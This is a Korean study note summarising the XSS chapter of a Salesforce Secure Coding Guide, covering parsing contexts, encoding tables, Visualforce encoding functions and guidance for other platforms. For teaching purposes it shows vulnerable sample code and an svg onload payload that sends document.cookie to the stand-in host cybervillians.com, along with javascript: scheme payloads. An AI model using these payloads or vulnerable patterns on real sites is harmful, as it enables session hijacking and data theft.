---
tags: [Security, SecureCoding, XSS, CrossSiteScripting, Visualforce, 보안가이드, 위협모델, 인코딩]
source: secure_coding (Secure Coding Guide, v67.0 Summer '26)
created: 2026-06-18
aliases: [XSS, Cross Site Scripting, 크로스사이트스크립팅, JSENCODE, HTMLENCODE, URLENCODE, JSINHTMLENCODE, secureFilters, VF 인코딩 함수, HTML 인코딩표, 브라우저 파싱 컨텍스트, 내 VF 페이지 XSS 막으려면, 사용자 입력을 화면에 그대로 출력해도 되나, 스크립트 주입 막는 법, 출력 인코딩 어떤 함수 써야 하나]
---

# XSS 방어

> XSS는 공격자가 악성 스크립트를 다른 사용자가 보는 페이지에 주입해 데이터 절도·session hijacking·콘텐츠 변조를 일으키는 공격 — 브라우저 파싱 단계별 인코딩과 Visualforce 인코딩 함수로 방어한다.

---

## 위협

XSS(Cross Site Scripting)는 공격자가 악성 스크립트를 웹페이지에 주입해 **데이터 절도, session hijacking, 콘텐츠 변조**를 일으키는 공격이다. 권한 없는 JavaScript/VBScript/HTML/active content를 다른 사용자가 보는 페이지에 삽입할 때 발생한다.

### Sample vulnerability (Visualforce)

```html
<apex:page>
<!-- Vulnerable Page at https://example.com/api/search -->
<div id='greet'></div>
<script>
document.querySelector('#greet').innerHTML='You searched for <b>{!$CurrentPage.parameters.q}</b>';
</script>
</apex:page>
```

공격자의 Evil Page는 `encodeURIComponent(payload)`로 svg onload payload를 `search?q=`에 주입한다. 서버가 echo back하면 victim 브라우저가 다음을 렌더한다:

```html
<svg onload='document.location.href="http://cybervillians.com?session="+document.cookie'>
```

→ victim의 cookie가 cybervillians.com으로 전송된다.

---

## 브라우저 파싱 개요 — Three Parsing Stages and Three Attacks

merge-field `{!$CurrentPage.parameters.q}`는 **HTML parser → JS parser → innerHTML(HTML parser)** 순으로 처리된다. 3개의 제어문자가 3개의 공격을 만든다:

- `>` — 원래 script block 탈출
- `'` — JavaScript string 선언 탈출
- `\x3c` 또는 `\u003c` 또는 `<` — innerHTML로 새 태그 주입

> **핵심 원칙(원문):** 모든 위험 문자를 외우기보다, **브라우저 파싱 단계 시퀀스를 식별하고 그에 대응하는 escaping 함수 시퀀스를 적용**하라.

### HTML Parsing and Encoding

태그 구조: `<tagname attrib1 attrib2='attrib2val' attrib3="attrib3val">textvalue</tagname>`. 여기서 attribute value와 textvalue만 데이터이고 나머지는 markup이다.

JS 주입의 2대 메커니즘:
1. script 태그/event handler를 지원하는 HTML 태그로 직접 주입
2. HTML 태그를 탈출한 뒤 event handler 태그를 생성

**HTML Encoding**은 character reference로 문자를 데이터화한다 — numeric character references(`&#decimal;` 또는 `&#xhex;`) / entity character references(`&mnemonic;`).

#### HTML 인코딩 문자표 (원문 — 셀 전수)

| Common Name | Symbol | Decimal Numeric | Hex Numeric | Entity |
|---|---|---|---|---|
| Ampersand | `&` | `&#38;` | `&#x26;` | `&amp;` |
| Less than Symbol | `<` | `&#60;` | `&#x3c;` | `&lt;` |
| Greater than Symbol | `>` | `&#62;` | `&#x3e;` | `&gt;` |
| Single Quote | `'` | `&#39;` | `&#27;` [^hexnote] | N/A |
| Double Quote | `"` | `&#34;` | `&#22;` [^hexnote] | `&quot;` |

[^hexnote]: **PDF 원문 인쇄 오류 주의:** Secure Coding Guide PDF 원문에 Single Quote의 Hex Numeric이 `&#27;`, Double Quote의 Hex Numeric이 `&#22;`로 인쇄되어 있다. 이는 위 표에 **원문 그대로** 옮긴 값이다. 그러나 hex numeric character reference는 `&#x`로 시작해야 하므로 **정상값은 Single Quote=`&#x27;`, Double Quote=`&#x22;`** 이다(decimal 39=hex 0x27, decimal 34=hex 0x22). 코드에 적용할 때는 정상값을 사용한다.

#### HTML Parsing Contexts (전수)

- **PCDATA / Normal Context** — 대부분의 태그. 중첩 태그가 균형을 이루고 DOM 렌더 전에 HTML decoding이 일어난다. 모든 character reference가 디코드되므로, 추가 인코딩 없이 후속 HTML 렌더 입력으로 쓰면 위험하다.
- **Raw Text / CDATA Parsing** — `<script>`, `<style>` 태그. 닫는 태그를 찾아 내용을 JS/CSS parser로 전달한다. **HTML decoding이 일어나지 않는다.** 함정: refactoring 이슈, JS string escapes, comment 관련 복잡한 파싱 규칙(`<script>` 중첩 금지, `<!--`를 `<script>`와 같은 줄에 두지 말 것).
- **Escapable Raw Text Parsing** — `<textarea>`, `<title>` 태그. 새 태그 생성은 불가하나 character reference는 디코드된다. 닫는 태그로 탈출이 가능하므로 user data가 탈출하지 못한다고 가정 금지.

### Javascript Parser — JS 인코딩 포맷 (전수)

- C-style backslash 인코딩 (backslash 문자 사용)
- 2 byte hex: `\xNN`
- 3 digit octal: `\NNN`
- 4 byte hex (UTF-16): `` `\uNNNN` `` (surrogate pair는 4 byte reference를 인접 배치 — `` `ꪪ뮻` ``)

#### JS encoder 동작표 (원문 — 셀 전수)

| Common Name | Symbol | Common JS Encoding |
|---|---|---|
| Single Quote | `'` | `\'` |
| Double Quote | `"` | `\"` |
| Backslash | `\ ` (단일 backslash) | `\\ ` (이중 backslash) |
| Carriage Return | N/A | `\r` |
| New Line | N/A | `\n` |
| Less than Symbol | `<` | `\x3c` |
| Greater than Symbol | `>` | `\x3e` |

> JS 인코딩은 HTML 인코딩만큼 강력하지 않다. 변수·함수·배열명을 JS 인코딩해도 호출 가능하므로 단순 인코딩이 데이터로 표시되지 않는다. JS 인코딩은 **quoted string 탈출 방지용**(quote, newline escape)이다. quoted 되지 않은 JS 컨텍스트의 user data는 어떤 것도 XSS를 방지하지 못하므로, 모든 user data는 **quote AND encode** 해야 한다. `eval`/`setInterval`/`Function` 사용 시 implicit eval마다 추가 JS 인코딩이 필요하므로, user data에 eval 사용은 금지를 권장한다.

### HTML Rendering Methods (JS가 HTML parser를 호출 — 전수)

`document.write`, `document.writeln`, `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML`

### Common jQuery HTML Rendering Methods (전수)

`.add()`, `.append()`, `.before()`, `.after()`, `.html()`, `.prepend()`, `.replaceWith()`, `.wrap()`, `.wrapAll()` (cf. Dom XSS Wiki)

jQuery 안전/취약 예제(원문):

```javascript
$('#xyz').append(payload);              // vulnerable
$('#xyz').append(html_encoded_payload); // safe
$('#xyz').text(payload);                // safe
$('#xyz').text(html_encoded_payload);   // safe but double encoded
```

### URI Parser

- 토큰: `scheme://login.password@address:port/path?query_string#fragment`
- 제어문자: scheme name, `:`, `.`, `?`, `/`, `#`. URI Encoding은 `%3f` 형태(RFC 3986, `%`+2 byte hex).
- **javascript pseudo scheme** `javascript:..payload..` 주의. scheme/`:`를 URI 인코딩하면 scheme이 미해석된다.

예제(원문):

```javascript
el.href='javascript:alert(1)';          // executes
el.href='javascript:\x61lert(1)';       // executes
el.href='javascript\x3aalert(1)';       // executes
el.href='javascript%3aalert(1)';        // does NOT execute
el.href="javascript&#x3a;alert(1)";     // does NOT execute
```

다중 파싱 시: `URIENCODE(HTMLENCODE(payload))`가 필요하다. HTML만 하면 `%3c`가 URI 디코드되어 bracket이 되고, URI만 하면 `<`가 직접 주입된다.

**JS 내장 URI 함수는 모두 보안 인코딩에 부적합 (전수):**
- `escape()`, `unescape()` — UTF-8 처리 불량으로 deprecated
- `encodeURI()`, `decodeURI()` — `://`, `.` 등 URI 제어문자를 인코딩하지 않음
- `encodeURIComponent()`, `decodeURIComponent()` — 모든 URI 제어문자를 인코딩하나 single quote 등 일부를 미인코딩

### CSS Parser

ISO 10646 인코딩(backslash + 최대 6 hex digit + trailing space). 단순 인코딩으로는 데이터로 표시되지 않는다(quoted string 탈출 방지용). 많은 CSS property value가 unquoted이므로 **allowlist를 엄격히 사용해야 한다.** moz-bindings, expression, javascript pseudo-scheme 등 구형 브라우저 기능을 주의한다(Salesforce가 구형 브라우저 지원). JS에서 CSS를 호출할 때(`element.style="x"`)는 JS 제어문자를 escape하고, allowlist 필터는 sink에 최대한 가깝게 둔다.

### General References (전수)

Coverity Static Analysis / OWASP XSS Portal / HTML5 Security Cheat Sheet / OWASP XSS Test Guide / Browser Internals and Parsing / Browser Security Handbook / Browser Parsing and XSS review of different frameworks.

---

## Specific Guidance — Apex and Visualforce Applications

플랫폼이 제공하는 보호 2종: ① auto HTML encoding, ② 수동으로 호출 가능한 built-in encoding 함수.

### Built in Auto Encoding

모든 merge-field는 **항상** auto HTML 인코딩된다. 단 다음 경우는 예외다:
- `<style>` 또는 `<script>` 태그 내부일 때
- `escape='false'` 속성을 가진 apex 태그 내부일 때

auto HTML encoding은 다른 VF 함수 이후 **마지막에** 적용되며, 다른 VF 인코딩 함수 사용 여부와 무관하다. `<`, `>`, HTML attribute 내 quote만 인코딩한다. JS/URL 인코딩, CSS XSS는 직접 처리해야 한다. 다중 파싱 컨텍스트(예: `<div onclick="console.log('{!$CurrentPage.parameters.userInput}')">`)에서는 auto-HTML 인코딩만으로 불충분하다.

### Unsafe sObject Data Types (원문 표 — 전수)

| Primitive Type | Restrictions on Values |
|---|---|
| url | 임의 텍스트 가능. scheme이 없으면 플랫폼이 `http://`를 prepend. |
| picklist | field 정의와 무관하게 임의 텍스트 가능. schema가 picklist 값을 강제하지 않으며, update call로 임의 텍스트 입력 가능. |
| text | 임의 텍스트 가능 |
| textarea | 임의 텍스트 가능 |
| rich text field | HTML 태그 allowlist 포함. 그 외 HTML 문자는 HTML 인코딩 필요. 나열된 태그는 HTML 렌더 컨텍스트에서 unencoded로 안전 사용 가능하나 다른 렌더 컨텍스트에서는 불가(JS 제어문자 미인코딩). |

Name field(및 username 같은 global 변수)는 임의 텍스트를 담을 수 있어 unsafe다. Id처럼 제어문자를 못 담는 타입도 방어적으로 렌더 컨텍스트 기반 출력 인코딩을 권장한다.

### Built in VisualForce encoding functions (전수)

- **JSENCODE** — JavaScript String 컨텍스트의 string 인코딩
- **HTMLENCODE** — 모든 문자를 HTML character reference로 인코딩(markup 해석 방지)
- **URLENCODE** — URL component 컨텍스트의 URI 인코딩(% style)
- **JSINHTMLENCODE** — `HTMLENCODE(JSENCODE(x))` 합성과 동등한 convenience 메서드

#### JSENCODE

quoted string 탈출을 방지한다. `<div onclick="console.log('{!JSENCODE($CurrentPage.parameters.userInput)}')">`는 HTML→JS 파싱이므로 `HTMLENCODE(JSENCODE(x))`가 필요하나, 플랫폼이 HTML auto-encode를 마지막에 하므로 inner JSENCODE만 명시한다.

defensive 패턴(원문):

```javascript
parseInt("{!JSENCODE(int_data)}");
parseFloat("{!JSENCODE(float_data)}");
// {!IF(bool_data,"true","false")}
JSON.parse("{!JSENCODE(stringified_value)}");
```

#### HTMLENCODE

auto-encode가 안 된 HTML 컨텍스트에 필요하다.

```html
<apex:outputText escape="false" value="<i>Hello {!HTMLENCODE(Account.Name)}</i>" />
```

script 내 innerHTML(JS→HTML 파싱):

```javascript
el.innerHTML = '{!JSENCODE(HTMLENCODE(Account.Name))}';
```

다중 예제 — HTML→JS→HTML = 3 layer, auto가 outer를 처리:

```html
<div onclick="this.innerHTML='Howdy {!JSENCODE(HTMLENCODE(Account.Name))}'">
```

극단 예제 — `HTMLENCODE(JSENCODE(HTMLENCODE(JSENCODE())))`가 필요한 케이스에서 auto가 outer HTMLENCODE를 처리하므로 다음으로 sanitize:

```html
'{!JSENCODE(HTMLENCODE(JSENCODE(Account.Name)))}'
```

#### URLENCODE

ascii 00-255를 `%XX`로 매핑한다. 절대 URL을 생성하지 않으며 URI component에만 쓴다.

```html
<img src="/xyz?name={!URLENCODE(Pic.name)}">
```

URLENCODE 후에는 추가 인코딩이 불필요하다(`%XX`는 타 컨텍스트의 제어문자가 아님). javascript pseudo-scheme를 주의해 scheme·host를 제어하고, host 선택 시 allowlist로 검증한다.

#### JSINHTMLENCODE

legacy 함수다. auto HTML encode 도입 전에 사용했다. 현재는 JS event handler in HTML에 `JSENCODE()`만으로 충분하다. `JSENCODE(HTMLENCODE(x))` 대체로 1 함수 호출을 절약할 수 있다.

```javascript
el.innerHTML = "Howdy {!JSINHTMLENCODE(Account.Name)}";
```

### XSS in CSS

`<style>` 태그 내 merge-field는 controller allowlist가 있을 때만 사용한다. 대안: JS 컨텍스트로 전달 후 검증, CSSOM/toolkit으로 style 업데이트.

```javascript
if ( /(^[0-9a-f]{6}$)|(^[0-9a-f]{3}$)/i.test(color) ) {
  el.style.color = '#' + color;
}
```

### Client-side encoding and API interfaces

JS로 API callout 후 DOM 렌더 시 VF 인코딩 함수를 쓸 수 없다. 클라이언트 렌더 시에는 플랫폼 auto-html 인코딩이 없다. cometd 취약 예제:

```javascript
data.innerHTML = JSON.stringify(message.data.sobject.xyz__c); // vulnerable
```

옵션: ① innerText 사용, ② JS에서 인코딩.

### Javascript Security Encoding Libraries

Salesforce는 JS 보안 인코딩 메서드를 제공하지 않는다. **Go Instant secure-filters** 라이브러리를 권장한다(Salesforce 보안팀 검증, node package). `secureFilters` 객체 메서드(전수):

- 기본: `secureFilters.html`, `secureFilters.js`, `secureFilters.uri`, `secureFilter.css`
- convenience: `secureFilters.style` (HTMLENCODE(CSS ENCODE)), `secureFilters.jsAttr` (HTMLENCODE(JS ENCODE), JS event handler용), `secureFilters.jsObj` (secure JSON.stringify)

### Avoiding Serialization

직렬화/역직렬화마다 인코딩이 필요하므로, innerHTML 대신 innerText, string 연결 대신 setAttribute, inline 대신 JS에서 event handler를 정의한다.

### Built-in API encodings — transport-layer 인코딩 정책표 (원문 — 셀 전수)

| API | Transport Layer Encoding Policy |
|---|---|
| SOAP API/REST API | never encodes |
| Streaming API | never encodes |
| Ajax Toolkit | never encodes |
| Javascript Remoting | HTML encoding unless explicit `{escape:'false'}` |
| Visualforce Object Remoting | always HTML encodes |

ForceTk client는 REST API를 사용하므로 raw를 반환한다:

```javascript
$j('#accountname').html(response.records[0].Name); // vulnerable
```

### Other taint sources

location, cookie, referer, window.Name, local storage, window.postMessage, xhr, jsonp. DOM property 전파 예제(section1/2/3)가 원문에 포함된다. (Dom XSS Wiki 참조)

### Javascript Micro Templates

logic-less(mustache.js) vs embedded JS(underscore_js `_template`). textarea hidden에 template을 저장하면 HTML 렌더가 발생하니 주의한다. **merge-field를 template data에 절대 넣지 말 것**(template은 `eval()`로 invoke됨).

**Underscore Templates** — `<%- %>`는 auto-HTML encode, `<%= %>`는 no encode(회피). HTML 인코딩만으로 불충분하므로 secureFilters를 추가한다. 4개 template 예제(취약/안전)가 원문에 포함된다.

### ESAPI and Encoding within Apex

controller 인코딩은 강력히 비권장한다(View-Controller 의존성). 부득이 시 최신 ESAPI를 사용한다:

```apex
ESAPI.encoder().SFDC_HTMLENCODE(usertext);
```

**사용 금지:** `String.escapeEcmaScript()`, `String.escapeHtml3()`, `String.escapeHtml4()` (Apache StringEscapeUtils 기반으로 보안 인코딩용으로 설계되지 않음).

### Dangerous Programming Constructs (전수)

- **S-Controls and Custom JavaScript Sources** — 다음은 극도로 취약(임의 JS 파일 주입):
  ```html
  <apex:includeScript value="{!$CurrentPage.parameters.userInput}" />
  ```
- **S-Control Template and Formula Tags** — `{!FUNCTION()}` 또는 `{!$OBJECT.ATTRIBUTE}`. XSS 보호가 없고 모든 출력이 unfiltered. 예: `{!$Api.Session_ID}`. `{!$Request.*}`는 취약(예: `{!$Request.title}` → `?title=Adios%3C%2Ftitle%3E%3Cscript%3E...`). 방어: `{!HTMLENCODE($Request.title)}` 중첩, 또는 SUBSTITUTE. 컨텍스트별 인코딩 예제: `{!URLENCODE($Request.retURL)}`, `{!JSINHTMLENCODE($Request.title)}`, `{!JSENCODE($Request.PageNumber)}`.

---

## General Guidance for Other Platforms

### Allowing HTML injection — Unsafe HTML Tags (전수)

`<applet>` `<body>` `<button>` `<embed>` `<form>` `<frame>` `<frameset>` `<html>` `<iframe>` `<image>` `<ilayer>` `<input>` `<layer>` `<link>` `<math>` `<meta>` `<object>` `<script>` `<style>` `<video>`

→ known-good subset allowlist 방식을 권장한다(Python/PHP ~100줄).

### HTTP Only Cookies

HttpOnly 설정 시 `document.cookie`를 빈 문자열로 만든다. **단 HttpOnly는 XSS 방어가 아니다**(단순 payload만 약간 지연). 부재가 버그/취약점은 아니다.

### Stored XSS Resulting from Arbitrary User Uploaded Content

CMS/email marketing 등. 별도 도메인(session cookie scope 밖)에서 콘텐츠를 서빙하는 것을 권장한다. 예: `app.site.com` → `content.site.com`에서 iframe + authentication token. Salesforce content 제품이 이 방식을 쓴다.

### HTTP Response Splitting

XSS 관련. user data가 HTTP header에 삽입되고 newline이 주입된다. `\n`, `\r`을 필터링한다.

### ASP.NET (전수)

request validation 기본 활성(`ValidateRequest` 기본 true). Input Validation: `<asp:RegularExpressionValidator>`, `System.Text.RegularExpressions`. Output: `System.Web.HttpUtility`의 `HtmlEncode`/`UrlEncode`(blocklist 방식), AntiXSS Library(allowlist). Tools: CAT.NET, Visual Studio static analysis.

### Java (전수)

Input Filtering: Struts Validator Plugin(`struts-config.xml`), Spring `org.springframework.validation.Validator` + ValidationUtils, OVal(AspectJ). Output: JSTL `<c:out>` escapeXml 기본 true, JSF `<h:outputText>`/`<h:outputFormat>` escape 기본 true. Freemarker는 `<#escape>` (`<#escape x as x?html>` 또는 `${username?html}`). custom JSP tag/scriptlet(`<%= request.getHeader("HTTP_REFERER") %>`)은 회피. OWASP ESAPI `org.owasp.esapi.codecs`.

### PHP (전수)

Input: PHP 5.2.0+ data filtering(sanitization/validation filters). Output: `htmlspecialchars`(`&`,`"`,`'`,`<`,`>`만), `htmlentities`(전체). `strip_tags`는 regex 기반이라 broken 태그로 우회 가능(`<<b>script>...` 예제). PHP 5.2.6에서는 동작한다.

---

## 관련 노트
- [[LWC 보안 패턴]]
- [[Lightning Security 모델]]
- [[CSP와 RemoteSite]]
- [[CSRF 방어]]
- [[Secure Communications (TLS)]]
- [[세션 ID와 브라우저 통신 위협]]
- [[Secure Coding 개요]]
- [[Platform Security FAQ]]
